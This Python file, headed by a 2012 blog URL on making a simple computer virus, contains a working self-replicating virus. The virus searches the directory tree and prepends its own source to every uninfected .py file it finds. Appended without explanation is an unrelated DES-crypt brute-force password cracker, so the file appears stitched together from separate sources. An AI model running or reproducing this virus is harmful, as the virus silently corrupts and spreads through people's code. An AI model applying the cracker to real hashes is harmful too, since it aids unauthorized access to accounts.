## https://cranklin.wordpress.com/2012/05/10/how-to-make-a-simple-computer-virus-with-python/
import os

marker = "VIRUS"

def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for name in filelist:
        if os.path.isdir(path+"/"+name):
            filestoinfect.extend(search(path+"/"+name))
        elif name[-3:] == ".py":
            infected = False
            for line in open(path+"/"+name):
                if marker in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+name)
    return filestoinfect

def infect(filestoinfect):
    number_files_infected=0
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
       virusstring += line
    virus.close
    for name in filestoinfect:
        number_files_infected+=1
        f = open(name)
        temp = f.read()
        f.close()
        f = open(name,"w")
        f.write(virusstring + temp)
        f.close()
    return number_files_infected

filestoinfect = search(os.path.abspath(""))
number_files_infected=infect(filestoinfect)
print("THE MALWARE IS OUT!, "+str(number_files_infected)+" FILES HAVE BEEN INFECTED!")
a="This file is infected by malware"
from passlib.hash import des_crypt
import time

# 1. Declare strings "list_of_saltchars" and "list_of_passchars"
list_of_saltchars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ./"
list_of_passchars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ./\-+%@,*"
def bruteForce(hashtobreak):
    # 2. Iterate the list of salt chars using two fors so that you can test all possible salt combinations
    for i in list_of_saltchars:
        for j in list_of_saltchars:
            salt = i+j
            # 3. For all characters in list_of_passchars, create a password by combining characters
            password_size = 0
            while True: # This while increments the size of the password indefinitely
                password_size+=1
                indexes = [0]*password_size # create a list to store the indexes to point
                while sum(indexes)<(len(list_of_passchars)-1)*password_size:
                    k = ''
                    for a in indexes: # This for creates the password based on the values from the list indexes
                        k = k + list_of_passchars[a]
                    attempt = des_crypt.hash(k, salt=salt)
                    if attempt == hashtobreak:
                        return k, salt
                    # Increment the password vector
                    flag = False
                    for b, a in enumerate(indexes):
                        if a<len(list_of_passchars)-1 and flag == False:
                            indexes[b]+=1
                            if b>0:
                                for c in range(len(indexes[:b])):
                                    indexes[c]=0
                            flag = True
            k = ''
            for a in indexes: # This for creates the password based on the values from the list indexes
                k = k + list_of_passchars[a]
            attempt = des_crypt.hash(k, salt=salt)
            if attempt == hashtobreak:
                return k, salt

## hash a new password
deshash4 = des_crypt.hash('0', salt='00')
t = time.time()
## crack the password
brokenhash, brokensalt = bruteForce(deshash4)
print('The password is:', brokenhash)
print('The salt is:', brokensalt)
print('Elapsed time to break the hash: ', time.time() - t)